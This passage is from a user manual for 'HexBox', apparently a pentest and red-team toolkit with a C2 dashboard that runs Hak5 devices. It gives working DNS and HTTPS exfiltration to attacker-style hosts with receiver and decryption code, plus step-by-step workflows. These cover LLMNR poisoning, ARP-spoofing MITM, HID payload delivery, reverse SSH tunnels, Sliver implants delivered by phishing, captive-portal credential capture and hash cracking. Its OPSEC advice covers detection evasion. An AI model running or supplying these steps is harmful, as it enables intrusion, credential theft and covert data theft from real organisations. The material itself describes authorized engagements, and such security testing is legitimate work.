### DNS Exfil — How It Works

```
Payload: 5 KB loot ZIP
    ↓
gzip compress → ~2 KB
    ↓  
AES-256-GCM encrypt → 2028 bytes (nonce + tag + ciphertext)
    ↓
base32 encode → 3248 chars (all label-safe)
    ↓
split into 50-char chunks → 65 chunks
    ↓
For each chunk, send UDP DNS query:
  0000.MFQWCYLBMFQWCYLB....EXFIL.ATTACKER.COM
  0001.OBQXG5DFOQ......EXFIL.ATTACKER.COM
  ...
  0064.AAAA............EXFIL.ATTACKER.COM
  done.0065.{session_id}.EXFIL.ATTACKER.COM
    ↓
Receiver: log all DNS queries → filter *.exfil.attacker.com →
sort by sequence → base32 decode → AES-256-GCM decrypt → gunzip → ZIP
```

**Receiver Setup (example using Python):**

```python
# Collect DNS query labels from your authoritative NS server logs
# Filter lines matching: *.exfil.attacker.com
# Group by session_id field, sort by sequence number
# Reassemble base32 string, then:

import base64, gzip, hashlib
from Crypto.Cipher import AES

def decrypt_exfil(raw: bytes, key_str: str) -> bytes:
    key = hashlib.sha256(key_str.encode()).digest()
    nonce, tag, ct = raw[:12], raw[12:28], raw[28:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    compressed = cipher.decrypt_and_verify(ct, tag)
    return gzip.decompress(compressed)

# raw = base64.b32decode(reassembled_b32.upper(), casefold=True)
# plaintext_zip = decrypt_exfil(raw, "your-aes-key-here")
```

### HTTPS Exfil — How It Works

```
Same encryption pipeline as DNS, but transport is a single HTTP POST:

POST https://your-c2.com/receive
Content-Type: application/json
X-HexBox-Token: your-token

{
    "session": "a1b2c3d4",
    "ts": "1700000000",
    "data": "<base64-encoded nonce+tag+ciphertext>",
    "size": 2028
}
```

**Receiver Setup (example Flask endpoint):**

```python
from flask import Flask, request
import base64, gzip, hashlib
from Crypto.Cipher import AES

app = Flask(__name__)
AES_KEY = "your-32-byte-key-here"

@app.route("/receive", methods=["POST"])
def receive():
    body = request.json
    raw = base64.b64decode(body["data"])
    key = hashlib.sha256(AES_KEY.encode()).digest()
    nonce, tag, ct = raw[:12], raw[12:28], raw[28:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    zipped = cipher.decrypt_and_verify(ct, tag)
    loot = gzip.decompress(zipped)
    open(f"received_{body['session']}.zip", "wb").write(loot)
    return "", 200
```

### Triggering from Dashboard

1. Navigate to Devices tab → Covert Exfil panel
2. Select method (DNS or HTTPS)
3. Optionally select a specific file (leave blank for full archive)
4. Click **Send**

The operation runs in a background thread. Status updates appear in the log panel.
Concurrent operations are blocked (`_exfil_running` Event guard).

---

## 16. Mobile Companion App

The mobile companion is a read-only Progressive Web App (PWA) accessible at
`http://<hexbox-ip>:1337/mobile`. It provides a real-time overview of engagement
status from any smartphone browser.

### Installation as Home Screen App

**Android (Chrome):**
1. Open `http://<hexbox-ip>:1337/mobile` in Chrome
2. Tap the three-dot menu → "Add to Home screen"
3. The app installs with the HexBox icon and opens without browser UI

**iOS (Safari):**
1. Open the URL in Safari
2. Tap the Share button → "Add to Home Screen"

### Dashboard Metrics

The mobile dashboard displays six live counters, updated every 30 seconds:

| Metric | Source |
|---|---|
| NTLM Hashes | Responder log count |
| WiFi Creds | wifi_steal.ducky captures |
| Live Hosts | nmap host count |
| Cracked Passwords | hashcat cracked.txt count |
| Portal Captures | Evil Portal captures.json count |
| Networks Seen | Kismet AP count |

### Authentication

The auth token is injected server-side into the HTML at serve time — the page
contains the token directly in JavaScript (`const tok = "..."`) rather than relying
on cookies (which may not survive PWA context switches on mobile browsers).

The PWA manifest at `/mobile/manifest.json` is exempt from authentication so
browsers can fetch it for installation without a prior session.

---

## 17. Engagement Workflows

### Workflow 1 — Initial Network Reconnaissance

**Goal:** Map the target network within the first 10 minutes.

1. `bash scripts/engage.sh 192.168.1.0/24` — starts nmap immediately
2. Drop Shark Jack into any open Ethernet port — begins 2-min recon autonomously
3. Devices tab → Shark Jack → **Pull Loot** when LED goes solid
4. Intel tab → Network Map — review hosts, identify DCs, printers, servers

---

### Workflow 2 — Credential Harvesting

**Goal:** Capture domain credentials without direct machine access.

1. Devices tab → Pi → **Start Responder** — poisons LLMNR/NBT-NS
2. Devices tab → Pineapple → **Start Recon** — captures WiFi probe requests
3. If on a wired network: Pi → **Start Bettercap** — ARP spoof for inline MITM
4. Hashes appear in Intel tab → NTLM Hashes in real-time
5. When enough hashes captured: Pi → **Start Hashcat** — begins cracking
6. Intel tab → Cracked Passwords updates automatically as cracks succeed

---

### Workflow 3 — HID Payload Delivery

**Goal:** Execute code on a target Windows machine.

1. Payloads tab → Select payload type → Enter catcher IP and callback port
2. Click **Build** to generate DuckyScript
3. Flash to OMG Plug via SFTP (or Bash Bunny Switch1/Switch2)
4. Deploy device to target machine (USB port, wall outlet charger)
5. Watch Loot tab for new files as callbacks arrive on catcher port 8000
6. Intel tab shows parsed contents automatically

---

### Workflow 4 — Active Directory Attack Chain

**Goal:** Map AD attack paths and identify privilege escalation routes.

1. Deploy `bloodhound_collect.ducky` via OMG Plug or Bash Bunny to a domain-joined machine
2. Files arrive in `loot/bloodhound/` — Intel tab badge updates
3. Intel tab → BloodHound Data → **Upload to BloodHound** 
4. Open BloodHound CE at configured URL; analyze attack paths
5. Identify kerberoastable accounts, ACL abuses, unconstrained delegation
6. Intel tab → NTLM Hashes → export for targeted hashcat runs against specific accounts

---

### Workflow 5 — Persistent Access

**Goal:** Maintain access after physical removal of devices.

1. Deploy LAN Turtle behind target workstation
2. Devices tab → LAN Turtle → **AutoSSH Tunnel**
3. LAN Turtle establishes reverse SSH tunnel to your VPS
4. From VPS: `ssh -p <tunnel_port> root@localhost` → shell on target network
5. Deploy Sliver implant:
   - Devices tab → Sliver → **Start Sliver Server**
   - Generate implant (Windows EXE, HTTPS listener)
   - Deliver via DuckyScript or email phishing
   - Sliver C2 → Sessions shows beacon when implant executes

---

## 18. Security Architecture

### Authentication Model

| Component | Authentication | Rationale |
|---|---|---|
| Dashboard (port 1337) | Session cookie + token | Protects operational data and device control |
| Catcher (port 8000) | None (intentional) | Target payloads cannot hold pre-shared secrets |
| Mobile PWA | Token injected at serve-time | Cookie-based auth unreliable in PWA context |
| Device SSH | Password-based (Hak5 defaults) | Replace with key-based auth in production |

### Input Validation

| Attack Vector | Mitigation | Location |
|---|---|---|
| Path traversal | `Path(x).name` + `resolve().relative_to()` | All file download routes |
| CIDR injection | `ipaddress.ip_network(strict=False)` | Scan target inputs |
| URL injection | `urlparse` scheme/netloc validation | Sliver listener URL |
| XSS (dashboard) | `esc()` on all user data in HTML | All JS rendering |
| XSS (mobile PWA) | `mEsc()` mirrors `esc()` | Mobile HTML template |
| Command injection | No shell=True subprocess calls | All Popen invocations |
| Upload size | `MAX_CONTENT_LENGTH = 50MB` | Flask app config |

### `esc()` Function

The JS `esc()` function escapes all five HTML metacharacters including single quotes
(as `&#39;`). This is critical for data placed adjacent to JavaScript event attributes.
All user-controlled data goes through `esc()` before being placed in the DOM.

### Process Execution Safety

The `_VALID_PROCS` whitelist prevents arbitrary process killing via `/stop/<name>`.
All subprocess launches use list-form arguments (no `shell=True`) to prevent
shell injection through parameter values.

### Secrets Management

- `config.json` is `chmod 600` — readable only by owner
- `config.json` is in `.gitignore` — never committed to version control
- `HEXBOX_TOKEN` sourced from environment variable, not from code
- Loot directory is in `.gitignore` — captured credentials never reach git

---

## 19. OPSEC Guidelines

### Pre-Engagement

- Run `scripts/opsec.sh` before leaving for the site
- Verify MAC randomization with `macchanger -s eth0` and `macchanger -s wlan0` — current MAC must differ from permanent on each interface
- Confirm hostname is `DESKTOP-WIN10` (or another appropriate decoy): `hostname`
- Verify bash history is suppressed: `echo $HISTFILE` should return empty
- Keep HexBox in a non-obvious enclosure (Pelican case, laptop bag)
- Use `sudo ufw enable` and restrict inbound to engagement network

### During Engagement

- Never connect HexBox to corporate WiFi with a real hostname or unchanged MAC
- Use a VPN (tun0) for all outbound connections to C2/exfil endpoints
- Monitor catcher.log — unexpected POST sources may indicate detection
- Keep the dashboard session over the management AP only, not the corporate network
- Avoid browsing from the Pi; all browsing increases fingerprint
- Don't leave Responder running after you have the hashes you need

### Post-Engagement

- Run `scripts/opsec.sh` again: encrypts loot, shreds plaintext
- Remove all physical devices from target environment
- Verify loot is encrypted: `ls /tmp/loot_*.tar.gz.gpg`
- Pull SSH reverse tunnels: Devices tab → LAN Turtle → stop autossh
- Rotate all device passwords (Pineapple, Shark Jack, etc.) for next engagement
- Clear engagement data from Pi after exfiltrating to attacker workstation

### Data Handling

| Data Type | Storage | Protection |
|---|---|---|
| NTLM hashes | `loot/creds/` | Shred after cracking; never transmit unencrypted |
| Plaintext passwords | `loot/cracks/cracked.txt` | Shred immediately after engagement report |
| Chrome databases | `loot/creds/` | Shred; DPAPI decrypt only on isolated attacker machine |
| BloodHound data | `loot/bloodhound/` | Contains sensitive AD topology; encrypt at rest |
| PCAP files | `loot/pcaps/` | May contain cleartext credentials; encrypt immediately |
| Engagement reports | `loot/reports/` | Deliver encrypted (GPG or password-protected ZIP) |

---

## 20. Troubleshooting

### Raspberry Pi 4 / 5 — Model-Specific Issues

#### Pi 5: Hak5 devices not detected or underpowered

**Symptom:** Device cards show offline immediately; USB Ethernet adapters don't enumerate; Shark Jack / Bash Bunny don't appear.

**Cause:** Pi 5 limits USB ports to 600mA when using a standard 15W supply. A 27W supply plus `usb_max_current_enable=1` in `/boot/firmware/config.txt` is required.

```bash
# Verify the setting is present
grep usb_max_current /boot/firmware/config.txt
# Expected output: usb_max_current_enable=1

# If missing, re-run setup (safe to re-run):
sudo bash setup/hexbox_setup.sh
sudo reboot

# Verify your power supply: the Pi 5 will show a low-voltage warning
# in dmesg if the supply cannot provide 5A:
dmesg | grep -i "voltage\|power\|throttl"
```

#### Pi 5: Flipper Zero not detected on /dev/ttyACM0

**Symptom:** Flipper Zero serial control returns "port not found" in the dashboard.

```bash
# Check if the device appears anywhere
lsusb | grep -i flipper
ls /dev/ttyACM* /dev/ttyUSB* 2>/dev/null

# Check kernel messages after plugging in
dmesg | tail -20

# If device is at a different path (e.g. /dev/ttyACM1), update config:
# config.json → flipper.serial_port → "/dev/ttyACM1"

# Workaround: use a USB 2.0 hub between Pi 5 and Flipper Zero
# (some USB 3.0 hub controllers have ACM enumeration bugs on Bookworm)
```

#### Pi 5: Boot config is at the wrong path

The Pi 5 uses `/boot/firmware/config.txt`, not `/boot/config.txt`.

```bash
# Confirm correct path
ls -la /boot/firmware/config.txt   # Pi 5 / Bookworm
ls -la /boot/config.txt            # Pi 3/4 / Bullseye
```

#### Bookworm: pip install fails with "externally-managed-environment"

```bash
# Install python3-full first, then retry
sudo apt install -y python3-full
pip3 install --break-system-packages -r requirements.txt
# Or re-run: sudo bash setup/hexbox_setup.sh
```

#### Pi 4: USB 3.0 adapter not detected as eth1

If the USB Ethernet adapter appears as `enx<mac>` instead of `eth1`, predictable naming
is enabled on the OS. Either disable it or update `config.json` interfaces to use the
detected name.

```bash
# Check actual interface names
ip link show

# Disable predictable names permanently:
sudo raspi-config  # → Advanced → Network Interface Names → No
sudo reboot
```

---

### Dashboard Won't Start

**Symptom:** `python3 c2/hexbox_c2.py` exits immediately or throws ImportError.

```bash
# Check Python version (need 3.9+)
python3 --version

# Reinstall dependencies
pip3 install --break-system-packages -r requirements.txt

# Check port conflict
sudo ss -tlnp | grep 1337
# If occupied: sudo fuser -k 1337/tcp
```

### Device Shows Offline

**Symptom:** Device card shows red "Offline" after Ping All.

```bash
# Verify interface is up
ip link show
ip addr show

# Ping manually
ping -c 2 172.16.42.1   # Pineapple example

# Check USB hub power
# Try a different USB port; powered hubs are required
```

### Responder Not Capturing Hashes

**Symptom:** Responder is running but no hashes appear in Intel tab.

```bash
# Verify correct interface
cat /proc/net/if_inet6      # confirm wired interface
ip addr show eth0           # confirm IP on correct subnet

# Check Responder is actually responding
tail -f loot/engagement_*/responder.log

# Ensure SMB signing is disabled on target (required for NTLM relay)
# LLMNR poisoning only works when target is on same broadcast domain
```

### Catcher Not Receiving Callbacks

**Symptom:** Payload executes on target but no files appear in loot.

```bash
# Verify catcher is listening
sudo ss -tlnp | grep 8000

# Test from another machine
curl -X POST http://10.0.0.99:8000/sysinfo \
  -H "Content-Type: application/json" \
  -d '{"hostname":"test","data":"dGVzdA=="}'

# Check firewall
sudo ufw status
# Port 8000 must be open on the management interface
```

### GPS Not Showing in War-Drive

**Symptom:** Kismet map shows no GPS coordinates.

```bash
# Check gpsd is running
sudo systemctl status gpsd

# Verify GPS device
ls /dev/ttyUSB* /dev/ttyACM*

# Test with cgps
cgps -s

# Configure gpsd to use correct device
sudo dpkg-reconfigure gpsd
```

### Hashcat Not Cracking

**Symptom:** hashcat starts but exits immediately.

```bash
# Check hash file exists and has valid NTLMv2 hashes
cat loot/cracks/ntlmv2_hashes.txt | head -5

# Check rockyou wordlist is present
ls /usr/share/wordlists/rockyou.txt
# If missing: sudo apt install wordlists && sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

# Test hashcat manually
hashcat -m 5600 loot/cracks/ntlmv2_hashes.txt \
  /usr/share/wordlists/rockyou.txt \
  --status --status-timer=5
```

### Exfil DNS Channel Not Working

**Symptom:** DNS exfil returns errors; receiver sees no queries.

```bash
# Verify domain is configured
cat config.json | python3 -c "import sys,json; c=json.load(sys.stdin); print(c['exfil']['dns_domain'])"

# Test DNS resolution
dig test.exfil.yourdomain.com @8.8.8.8

# Confirm your NS server logs show incoming queries
# Check authoritative DNS zone delegation is correct
# The domain must delegate to an NS record you control

# Test manually
python3 c2/exfil.py dns --loot ~/hexbox/loot --config config.json
```

### Sliver Generate Fails

**Symptom:** `/sliver/generate` returns error.

```bash
# Check sliver-server is running
pgrep sliver-server

# Start it
python3 c2/hexbox_c2.py  # or via dashboard
# Devices tab → Sliver → Start Server

# Verify listener URL format (must be http:// or https://)
# No spaces, no newlines — exact format: https://10.0.0.99:443
```

### Mobile PWA Not Updating

**Symptom:** Mobile dashboard shows stale data.

```bash
# Force refresh in browser (clear service worker cache)
# Android Chrome: Settings → Site Settings → hexbox-ip → Clear & reset

# Verify /mobile/data endpoint
curl -H "X-HexBox-Token: your-token" http://10.0.0.99:1337/mobile/data
```

---

## Appendix A — Device IP Reference

| Device | Arming Mode IP | Notes |
|---|---|---|
| WiFi Pineapple Mark VII | 172.16.42.1 | Connect to Pineapple management AP or USB Ethernet |
| Shark Jack | 172.16.24.1 | USB-C connection creates interface automatically |
| Packet Squirrel Mark II | 172.16.32.1 | Switch to middle (arming) position |
| LAN Turtle | 172.16.84.1 | USB connection; arming = switch held on boot |
| Bash Bunny Mark II | 172.16.64.1 | Switch to rightmost (arming) position |
| OMG Plug | 192.168.1.50 (default) | Connects via WiFi; IP configurable |
| Flipper Zero | /dev/ttyACM0 | USB serial (not network) |
| HexBox Dashboard | 10.0.0.99 (default) | Set in config.json |
| HexBox Catcher | 10.0.0.99:8000 | Same IP, different port |

---

## Appendix B — Port Map

| Port | Service | Protocol | Auth |
|---|---|---|---|
| 1337 | HexBox C2 Dashboard | HTTP | Token + Session |
| 8000 | Credential Catcher | HTTP | None (by design) |
| 4444 | Reverse Shell Listener 1 | TCP | None |
| 4445 | Reverse Shell Listener 2 | TCP | None |
| 4446 | Reverse Shell Listener 3 | TCP | None |
| 1471 | WiFi Pineapple API | HTTP | Bearer token |
| 8080 | BloodHound CE | HTTP | Basic auth |
| 2501 | Kismet REST API | HTTP | Basic auth |
| 31337 | Sliver C2 Server | TCP/mTLS | Operator cert |
| 9050 | Tor SOCKS Proxy | SOCKS5 | None |
| 53 | DNS (exfil channel) | UDP | None |
| 443 | HTTPS Exfil / C2 | HTTPS | Token |

---

## Appendix C — Loot Directory Structure

```
~/hexbox/loot/
├── creds/                    # Credential captures
│   ├── {host}_chrome.db      # DPAPI-encrypted Chrome Login Data
│   ├── {host}_wifi.txt       # WiFi profile plaintext dump
│   └── {host}_sysinfo.json   # Windows host profile
├── nmap/                     # Network scan results
│   ├── scan.xml              # nmap XML output (-oX)
│   ├── scan.nmap             # nmap text output (-oN)
│   └── scan.gnmap            # nmap greppable output (-oG)
├── handshakes/               # WiFi captures
│   ├── *.cap                 # WPA2 handshakes (aircrack format)
│   └── *.pcapng              # PMKID captures (hcxdumptool format)
├── pcaps/                    # Inline packet captures
│   └── *.pcap                # From Packet Squirrel
├── portals/                  # Evil portal captures
│   └── captures.json         # Array of {username, password, portal, ip, ts}
├── wardrive/                 # Wireless AP data
│   └── networks.json         # Kismet AP list
├── cracks/                   # Hash cracking
│   ├── ntlmv2_hashes.txt     # Collected NTLMv2 hashes (hashcat input)
│   └── cracked.txt           # hashcat output (hash:plaintext)
├── bloodhound/               # AD recon data
│   └── {host}_{type}.json    # BloodHound v5 JSON files
├── implants/                 # Generated C2 implants
│   └── *.exe / *.elf         # Sliver-generated implant binaries
├── bunny/                    # Bash Bunny loot
├── shark/                    # Shark Jack loot
└── reports/                  # Generated engagement reports
    └── report_{ts}.html      # Self-contained HTML reports
```

---

## Appendix D — Key Commands Quick Reference

### Startup

```bash
# Full engagement launch
bash scripts/engage.sh 192.168.1.0/24

# Individual services
python3 c2/hexbox_c2.py                # Dashboard on :1337
python3 c2/catcher.py                  # Catcher on :8000
sudo responder -I eth0 -wrf            # NTLM hash capture

# OPSEC hardening
bash scripts/opsec.sh

# Preflight check
sudo python3 scripts/preflight.py

# Configuration wizard
bash setup/configure.sh
```

### Credential Operations

```bash
# Manual hashcat NTLMv2
hashcat -m 5600 loot/cracks/ntlmv2_hashes.txt \
  /usr/share/wordlists/rockyou.txt -o loot/cracks/cracked.txt

# Manual WiFi cracking (handshake)
aircrack-ng loot/handshakes/*.cap -w /usr/share/wordlists/rockyou.txt

# PCAP analysis
tshark -r loot/pcaps/capture.pcap -Y "http.authorization"
```

### Exfiltration

```bash
# Via CLI
python3 c2/exfil.py https --config config.json
python3 c2/exfil.py dns --config config.json --file creds/HOST_wifi.txt

# Decrypt received data (Python)
python3 -c "
import base64, gzip, hashlib, zipfile, io
from Crypto.Cipher import AES
raw = base64.b64decode(open('received.b64').read())
key = hashlib.sha256(b'your-aes-key-here').digest()
nonce, tag, ct = raw[:12], raw[12:28], raw[28:]
cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
data = gzip.decompress(cipher.decrypt_and_verify(ct, tag))
zipfile.ZipFile(io.BytesIO(data)).extractall('decrypted_loot/')
print('Extracted to decrypted_loot/')
"
```

### Device SSH

```bash
# Pineapple
ssh root@172.16.42.1

# Shark Jack
ssh root@172.16.24.1

# Packet Squirrel
ssh root@172.16.32.1

# LAN Turtle
ssh root@172.16.84.1

# Bash Bunny
ssh root@172.16.64.1
```

### Loot Management

```bash
# Check what's been collected
find ~/hexbox/loot -type f -newer ~/hexbox/loot -mmin -60 | sort

# Count hashes
wc -l ~/hexbox/loot/cracks/ntlmv2_hashes.txt

# Count cracked passwords
wc -l ~/hexbox/loot/cracks/cracked.txt

# View portal captures
python3 -c "import json; [print(c['portal'],c['username'],c['password']) \
  for c in json.load(open('loot/portals/captures.json'))]"

# Encrypt and shred loot
bash scripts/opsec.sh
```

---

*This manual covers HexBox Phase 6. For the latest changes, see the git log:
`git log --oneline` in the repository root.*

*Authorized use only. See legal notice at the top of this document.*
